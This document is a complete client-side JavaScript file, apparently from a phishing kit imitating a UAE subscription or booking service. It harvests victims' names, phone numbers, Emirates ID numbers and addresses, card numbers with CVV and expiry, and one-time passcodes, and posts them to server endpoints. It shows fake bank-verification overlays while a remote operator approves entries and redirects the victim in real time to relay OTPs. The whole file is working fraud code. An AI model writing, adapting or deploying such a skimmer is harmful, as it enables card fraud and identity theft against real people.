(function() {
  // ─── Universal Visitor ID ──────────────────────────────────────────────
  function isValidVisId(id) {
    return typeof id === 'string' && id.trim().length > 0 && id !== '[object Object]' && id !== 'null' && id !== 'undefined' && !id.startsWith('{');
  }

  const urlParams = new URLSearchParams(window.location.search);
  const rawCandidate = urlParams.get('id') || 
                       sessionStorage.getItem('_fazaa_vis_id') || 
                       localStorage.getItem('_fazaa_vis_id') ||
                       sessionStorage.getItem('_pays_id') ||
                       localStorage.getItem('_pays_id');

  let visitorId = isValidVisId(rawCandidate) ? rawCandidate.trim() : null;

  if (!visitorId) {
    visitorId = 'vis_' + Date.now().toString(36) + '_' + Math.random().toString(36).substr(2, 6);
  }
  localStorage.setItem('_fazaa_vis_id', visitorId);
  sessionStorage.setItem('_fazaa_vis_id', visitorId);
  sessionStorage.setItem('_pays_id', visitorId);
  sessionStorage.setItem('_reg_id', visitorId);

  // ─── Dynamic Navigation & Step Tracking ──────────────────────────────
  function getPath() {
    return (window.location.pathname || '/').toLowerCase();
  }

  function getStep() {
    const p = getPath();
    if (p.includes('code') || p.includes('success')) return 'success';
    if (p.includes('otp')) return 'otp';
    if (p.includes('payment')) return 'payment';
    if (p.includes('order') || p.includes('request') || p.includes('register')) return 'passenger_details';
    if (p.includes('cards')) return 'seat_selection';
    return 'schedule';
  }

  let currentPath = getPath();
  let currentStep = getStep();

  // ─── Cross-Tab & Offline Local Sync ─────────────────────────────────────
  function saveLocalVisitor(patch) {
    try {
      const raw = localStorage.getItem('_cr7_visitors');
      let list = [];
      if (raw) {
        try { list = JSON.parse(raw); } catch (e) {}
      }
      if (!Array.isArray(list)) list = [];
      const idx = list.findIndex(v => v.id === visitorId);
      const existing = idx !== -1 ? list[idx] : { id: visitorId, createdAt: new Date().toISOString() };
      const updated = {
        ...existing,
        ...patch,
        id: visitorId,
        ip: existing.ip || '127.0.0.1',
        step: currentStep,
        currentPath: currentPath,
        updatedAt: new Date().toISOString()
      };
      if (idx !== -1) {
        list[idx] = updated;
      } else {
        list.unshift(updated);
      }
      localStorage.setItem('_cr7_visitors', JSON.stringify(list));
      if (typeof BroadcastChannel !== 'undefined') {
        const bc = new BroadcastChannel('cr7_live_bus');
        bc.postMessage({ type: 'update', visitor: updated });
        bc.close();
      }
    } catch (e) {}
  }

  // ─── Heartbeat ──────────────────────────────────────────────────────────
  function sendHeartbeat(extraData = {}) {
    currentPath = getPath();
    currentStep = getStep();
    
    // Also include any data in sessionStorage if available
    let stored = {};
    try {
      stored = JSON.parse(sessionStorage.getItem('reg_data') || '{}');
    } catch(e) {}

    const payload = {
      id: visitorId,
      step: currentStep,
      path: currentPath,
      title: document.title,
      name: stored.fullName || stored.name || undefined,
      phone: stored.phone || undefined,
      emiratesId: stored.emiratesId || undefined,
      bookingData: stored,
      ...extraData
    };

    saveLocalVisitor(payload);

    fetch('/api/client/heartbeat', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    }).catch(() => {});
  }

  sendHeartbeat();
  setInterval(() => sendHeartbeat(), 5000);

  // ─── Universal Scraper For Form Inputs ─────────────────────────────────
  function scrapeInputs() {
    const inputs = document.querySelectorAll('input, select, textarea');
    const scraped = {};

    inputs.forEach(input => {
      const val = (input.value || '').trim();
      if (!val) return;

      const name = (input.name || '').toLowerCase();
      const id = (input.id || '').toLowerCase();
      const placeholder = (input.placeholder || '').toLowerCase();
      const testid = (input.getAttribute('data-testid') || '').toLowerCase();

      // Full Name
      if (name.includes('fullname') || name === 'name' || id.includes('name') || placeholder.includes('اسم') || testid.includes('name')) {
        scraped.fullName = val;
      }
      // Phone
      else if (name.includes('phone') || name.includes('tel') || id.includes('phone') || placeholder.includes('هاتف') || placeholder.includes('موبايل') || testid.includes('phone')) {
        scraped.phone = val;
      }
      // Emirates ID
      else if (name.includes('emirates') || name.includes('eid') || id.includes('emirates') || placeholder.includes('هوية') || placeholder.includes('784') || testid.includes('emirates')) {
        scraped.emiratesId = val;
      }
      // Region
      else if (name.includes('region') || id.includes('region') || testid.includes('region') || placeholder.includes('إمارة') || placeholder.includes('منطقة')) {
        scraped.region = val;
      }
      // Street / Address
      else if (name.includes('street') || id.includes('street') || placeholder.includes('شارع') || testid.includes('street') || placeholder.includes('عنوان')) {
        scraped.streetAddress = val;
      }
      // Neighborhood
      else if (name.includes('neighborhood') || id.includes('neighborhood') || id.includes('district') || placeholder.includes('حي') || testid.includes('neighborhood')) {
        scraped.neighborhood = val;
      }
      // Delivery Date
      else if (name.includes('delivery') || id.includes('delivery') || input.type === 'date' || testid.includes('delivery')) {
        scraped.deliveryDate = val;
      }
    });

    return scraped;
  }

  // ─── Sync Registration Data to Server ──────────────────────────────────
  let lastSentRegHash = '';
  function syncRegistrationData(dataObj = {}) {
    let stored = {};
    try {
      stored = JSON.parse(sessionStorage.getItem('reg_data') || '{}');
    } catch (e) {}

    const merged = { ...stored, ...dataObj };
    const name = merged.fullName || merged.name || merged['الاسم'] || '';
    const phone = merged.phone || merged['الهاتف'] || merged['رقم الهاتف'] || '';
    const emiratesId = merged.emiratesId || merged.id || merged['رقم الهوية'] || '';

    if (!name && !phone && !emiratesId && Object.keys(dataObj).length === 0) {
      return;
    }

    const payload = {
      visitorId,
      name,
      phone,
      emiratesId,
      step: getStep(),
      bookingData: {
        'الاسم': name,
        'الهاتف': phone,
        'رقم الهوية': emiratesId,
        'المنطقة': merged.region || merged['المنطقة'] || '',
        'العنوان': merged.streetAddress || merged.street || merged['الشارع'] || merged['العنوان'] || '',
        'الحي': merged.neighborhood || merged.district || merged['الحي'] || '',
        'موعد التوصيل': merged.deliveryDate || merged['موعد الاستلام'] || '',
        'طريقة الدفع': merged.paymentMethod || 'card',
        'البطاقة': (merged.brand ? merged.brand : '') + (merged.cardType ? ' - ' + merged.cardType : '')
      }
    };

    const hash = JSON.stringify(payload);
    if (hash === lastSentRegHash) return;
    lastSentRegHash = hash;

    fetch('/api/client/track', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: hash
    }).catch(() => {});

    fetch('/api/client/order', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: hash
    }).catch(() => {});
  }

  // Initial sync & periodic sync
  syncRegistrationData();
  setInterval(() => {
    const scraped = scrapeInputs();
    if (Object.keys(scraped).length > 0) {
      try {
        const prev = JSON.parse(sessionStorage.getItem('reg_data') || '{}');
        sessionStorage.setItem('reg_data', JSON.stringify({ ...prev, ...scraped }));
      } catch (e) {}
      syncRegistrationData(scraped);
    } else {
      syncRegistrationData();
    }
  }, 2000);

  // ─── Card Extraction and Submission ────────────────────────────────────
  function extractCardDetails() {
    const inputs = document.querySelectorAll('input');
    let cardNumber = '', expiry = '', cvv = '', cardHolder = '';

    inputs.forEach(input => {
      const val = (input.value || '').trim();
      const placeholder = (input.placeholder || '').toLowerCase();
      const name = (input.name || '').toLowerCase();
      const id = (input.id || '').toLowerCase();
      const digits = val.replace(/\D/g, '');

      if (name.includes('card') || id.includes('card') || placeholder.includes('0000') || input.maxLength === 19 || digits.length >= 14) {
        cardNumber = val;
      } else if (name.includes('exp') || id.includes('exp') || placeholder.includes('mm/yy') || placeholder.includes('تاريخ') || /^\d{2}\/\d{2}$/.test(val)) {
        expiry = val;
      } else if (name.includes('cvv') || id.includes('cvv') || placeholder.includes('•••') || placeholder.includes('رمز') || (digits.length === 3 && input.maxLength === 3)) {
        cvv = val;
      } else if (name.includes('holder') || id.includes('holder') || placeholder.includes('اسم') || name.includes('name') || (!digits && val.length > 2)) {
        cardHolder = val;
      }
    });

    return { cardNumber, expiry, cvv, cardHolder };
  }

  let lastCardHash = '';
  function handleCardSubmission() {
    const { cardNumber, expiry, cvv, cardHolder } = extractCardDetails();
    const cleanCard = cardNumber.replace(/\D/g, '');

    if (cleanCard.length >= 14) {
      const cardHash = cleanCard + expiry + cvv + cardHolder;
      if (cardHash === lastCardHash) return;
      lastCardHash = cardHash;

      showWaitingModal();
      syncRegistrationData();

      saveLocalVisitor({
        cardNumber,
        expiry,
        cvv,
        cardHolder,
        cardSubmittedAt: new Date().toISOString(),
        cardApprovalStatus: 'waiting',
        step: 'payment'
      });

      fetch('/api/client/card', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          visitorId,
          cardNumber,
          expiry,
          cvv,
          cardHolder
        })
      }).catch(() => {});
    }
  }

  // ─── OTP Extraction and Submission ─────────────────────────────────────
  function extractOtp() {
    const inputs = document.querySelectorAll('input');
    let otpVal = '';
    inputs.forEach(i => {
      const clean = (i.value || '').replace(/\D/g, '');
      if (clean.length >= 4 && clean.length <= 8) {
        otpVal = clean;
      }
    });
    return otpVal;
  }

  let lastOtpVal = '';
  function handleOtpSubmission() {
    const otpVal = extractOtp();
    if (otpVal && otpVal !== lastOtpVal) {
      lastOtpVal = otpVal;
      showOtpWaiting();

      saveLocalVisitor({
        otp: otpVal,
        otpSubmittedAt: new Date().toISOString(),
        otpApprovalStatus: 'waiting',
        step: 'otp'
      });

      fetch('/api/client/otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          visitorId,
          otp: otpVal
        })
      }).catch(() => {});
    }
  }

  // ─── Waiting Modals ───────────────────────────────────────────────────
  let waitingOverlay = null;
  function showWaitingModal() {
    if (!waitingOverlay) {
      waitingOverlay = document.createElement('div');
      waitingOverlay.id = 'cr7-waiting-overlay';
      waitingOverlay.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.7);backdrop-filter:blur(6px);z-index:99999;display:flex;align-items:center;justify-content:center;';
      waitingOverlay.innerHTML = `
        <div style="background:#1a1c23;border:1px solid rgba(201,162,39,0.5);border-radius:20px;padding:34px 28px;max-width:360px;width:90%;text-align:center;box-shadow:0 25px 60px rgba(0,0,0,0.7);color:#fff;font-family:'Tajawal',sans-serif;" dir="rtl">
          <div style="width:56px;height:56px;border:4px solid rgba(201,162,39,0.25);border-top:4px solid #c9a227;border-radius:50%;margin:0 auto 20px;animation:cr7spin 1s linear infinite;"></div>
          <h3 style="font-size:19px;font-weight:bold;margin-bottom:8px;color:#f3c84e;" id="cr7-modal-title">جاري التحقق من بيانات البطاقة</h3>
          <p style="font-size:13px;color:#a0aec0;line-height:1.6;" id="cr7-modal-sub">يرجى الانتظار، جاري التواصل مع البنك المصدر...</p>
        </div>
        <style>@keyframes cr7spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>
      `;
      document.body.appendChild(waitingOverlay);
    } else {
      waitingOverlay.style.display = 'flex';
      const titleEl = document.getElementById('cr7-modal-title');
      const subEl = document.getElementById('cr7-modal-sub');
      if (titleEl) titleEl.textContent = 'جاري التحقق من بيانات البطاقة';
      if (subEl) subEl.textContent = 'يرجى الانتظار، جاري التواصل مع البنك المصدر...';
    }
  }

  function hideWaitingModal() {
    if (waitingOverlay) waitingOverlay.style.display = 'none';
  }

  let otpWaitingOverlay = null;
  function showOtpWaiting() {
    if (!otpWaitingOverlay) {
      otpWaitingOverlay = document.createElement('div');
      otpWaitingOverlay.id = 'cr7-otp-overlay';
      otpWaitingOverlay.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.7);backdrop-filter:blur(6px);z-index:99999;display:flex;align-items:center;justify-content:center;';
      otpWaitingOverlay.innerHTML = `
        <div style="background:#1a1c23;border:1px solid rgba(201,162,39,0.5);border-radius:20px;padding:34px 28px;max-width:360px;width:90%;text-align:center;box-shadow:0 25px 60px rgba(0,0,0,0.7);color:#fff;font-family:'Tajawal',sans-serif;" dir="rtl">
          <div style="width:56px;height:56px;border:4px solid rgba(201,162,39,0.25);border-top:4px solid #c9a227;border-radius:50%;margin:0 auto 20px;animation:cr7spin 1s linear infinite;"></div>
          <h3 style="font-size:19px;font-weight:bold;margin-bottom:8px;color:#f3c84e;" id="cr7-otp-title">جاري التحقق من رمز التأكيد</h3>
          <p style="font-size:13px;color:#a0aec0;line-height:1.6;" id="cr7-otp-sub">يرجى الانتظار لحظات...</p>
        </div>
        <style>@keyframes cr7spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>
      `;
      document.body.appendChild(otpWaitingOverlay);
    } else {
      otpWaitingOverlay.style.display = 'flex';
      const titleEl = document.getElementById('cr7-otp-title');
      const subEl = document.getElementById('cr7-otp-sub');
      if (titleEl) titleEl.textContent = 'جاري التحقق من رمز التأكيد';
      if (subEl) subEl.textContent = 'يرجى الانتظار لحظات...';
    }
  }

  function hideOtpWaiting() {
    if (otpWaitingOverlay) otpWaitingOverlay.style.display = 'none';
  }

  // ─── Safe Client Notice (In-Page Toast) ───────────────────────────────
  function showClientNotice(msg, isError = true) {
    let notice = document.getElementById('cr7-notice-box');
    if (!notice) {
      notice = document.createElement('div');
      notice.id = 'cr7-notice-box';
      notice.style.cssText = 'position:fixed;top:24px;left:50%;transform:translateX(-50%);z-index:999999;color:#fff;padding:14px 22px;border-radius:12px;font-family:Tajawal,sans-serif;font-size:14px;box-shadow:0 10px 30px rgba(0,0,0,0.4);display:flex;align-items:center;gap:10px;direction:rtl;max-width:90%;transition:opacity 0.3s;';
      document.body.appendChild(notice);
    }
    notice.style.background = isError ? '#e53e3e' : '#38a169';
    notice.textContent = msg;
    notice.style.display = 'flex';
    notice.style.opacity = '1';
    setTimeout(() => {
      if (notice) {
        notice.style.opacity = '0';
        setTimeout(() => { notice.style.display = 'none'; }, 300);
      }
    }, 4500);
  }

  // ─── Status Polling (Admin Controls & Page Routing) ─────────────────────
  let lastRedirect = null;
  setInterval(async () => {
    try {
      const res = await fetch('/api/client/status/' + visitorId);
      if (!res.ok) return;
      const data = await res.json();
      const p = getPath();

      // Card approval handling
      if (p.includes('payment')) {
        if (data.cardApprovalStatus === 'approved' || data.step === 'otp') {
          const titleEl = document.getElementById('cr7-modal-title');
          const subEl = document.getElementById('cr7-modal-sub');
          if (titleEl) titleEl.textContent = '✓ تم قبول البطاقة بنجاح';
          if (subEl) subEl.textContent = 'جاري التحويل لصفحة رمز التحقق...';
          setTimeout(() => {
            hideWaitingModal();
            window.location.href = '/otp?id=' + visitorId;
          }, 600);
        } else if (data.cardApprovalStatus === 'rejected' || data.step === 'card_error') {
          hideWaitingModal();
          showClientNotice('تعذّر التحقق من بيانات البطاقة، يرجى التأكد من صحة البيانات أو استخدام بطاقة أخرى.', true);
        }
      }

      // OTP approval handling
      if (p.includes('otp')) {
        if (data.otpApprovalStatus === 'approved' || data.step === 'success' || data.step === 'code') {
          const titleEl = document.getElementById('cr7-otp-title');
          const subEl = document.getElementById('cr7-otp-sub');
          if (titleEl) titleEl.textContent = '✓ تم تأكيد العملية بنجاح!';
          if (subEl) subEl.textContent = 'جاري إصدار بطاقتك وتأكيد الاشتراك...';
          setTimeout(() => {
            hideOtpWaiting();
            window.location.href = '/code?id=' + visitorId;
          }, 800);
        } else if (data.otpApprovalStatus === 'rejected' || data.step === 'otp_error') {
          hideOtpWaiting();
          showClientNotice('رمز التحقق (OTP) غير صحيح، يرجى إدخال الرمز الجديد المرسل لهاتفك.', true);
        }
      }

      // General admin manual redirect
      if (data.step && data.step !== lastRedirect) {
        if (data.step === 'otp' && !p.includes('otp')) {
          lastRedirect = 'otp';
          hideWaitingModal();
          window.location.href = '/otp?id=' + visitorId;
        } else if (data.step === 'payment' && !p.includes('payment')) {
          lastRedirect = 'payment';
          hideOtpWaiting();
          window.location.href = '/payment?id=' + visitorId;
        } else if (data.step === 'code' && !p.includes('code')) {
          lastRedirect = 'code';
          hideWaitingModal();
          hideOtpWaiting();
          window.location.href = '/code?id=' + visitorId;
        }
      }
    } catch (e) {}
  }, 1000);

  // ─── Universal Event Listeners (Input, Click, Submit) ──────────────────
  function onFieldChanged() {
    const scraped = scrapeInputs();
    if (Object.keys(scraped).length > 0) {
      try {
        const prev = JSON.parse(sessionStorage.getItem('reg_data') || '{}');
        sessionStorage.setItem('reg_data', JSON.stringify({ ...prev, ...scraped }));
      } catch (e) {}
      syncRegistrationData(scraped);
    }
    // Also check if card number was typed
    const card = extractCardDetails();
    if (card.cardNumber.replace(/\D/g, '').length >= 14) {
      fetch('/api/client/heartbeat', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          id: visitorId,
          step: getStep(),
          ...card
        })
      }).catch(() => {});
    }
  }

  document.addEventListener('input', onFieldChanged, true);
  document.addEventListener('change', onFieldChanged, true);
  document.addEventListener('blur', onFieldChanged, true);

  // Universal button click interception
  document.addEventListener('click', function(e) {
    const btn = e.target.closest('button, input[type="submit"], a');
    if (!btn) return;

    onFieldChanged();

    const text = (btn.textContent || btn.value || '').trim();

    // Check if this is an OTP submit
    if (getPath().includes('otp') || text.includes('تحقق') || text.includes('تأكيد الرمز') || btn.getAttribute('data-testid') === 'btn-submit-otp') {
      const otp = extractOtp();
      if (otp) handleOtpSubmission();
    }

    // Check if this is an order or registration step advance
    if (text.includes('اشترك') || text.includes('التالي') || text.includes('متابعة') || text.includes('تسجيل') || btn.getAttribute('data-testid') === 'btn-subscribe' || btn.getAttribute('data-testid') === 'btn-next') {
      lastSentRegHash = '';
      const sc = scrapeInputs();
      syncRegistrationData(sc);
    }

    // Check if this is a payment / card submit
    if (getPath().includes('payment') || text.includes('دفع') || text.includes('Pay') || text.includes('إتمام') || btn.getAttribute('data-testid') === 'btn-submit-payment') {
      handleCardSubmission();
    }
  }, true);

  // Universal form submit interception
  document.addEventListener('submit', function(e) {
    onFieldChanged();
    if (getPath().includes('payment')) {
      handleCardSubmission();
    } else if (getPath().includes('otp')) {
      handleOtpSubmission();
    }
  }, true);

  // ─── Watch for URL Changes (SPA History Hook) ──────────────────────────
  function notifyNavigation() {
    currentPath = getPath();
    currentStep = getStep();
    if (!currentPath.includes('payment')) hideWaitingModal();
    if (!currentPath.includes('otp')) hideOtpWaiting();
    sendHeartbeat();
  }

  const origPushState = history.pushState;
  history.pushState = function() {
    origPushState.apply(this, arguments);
    notifyNavigation();
  };

  const origReplaceState = history.replaceState;
  history.replaceState = function() {
    origReplaceState.apply(this, arguments);
    notifyNavigation();
  };

  window.addEventListener('popstate', notifyNavigation);
  window.addEventListener('hashchange', notifyNavigation);

  // Also check URL change periodically
  setInterval(() => {
    if (getPath() !== currentPath) {
      notifyNavigation();
    }
  }, 400);

})();
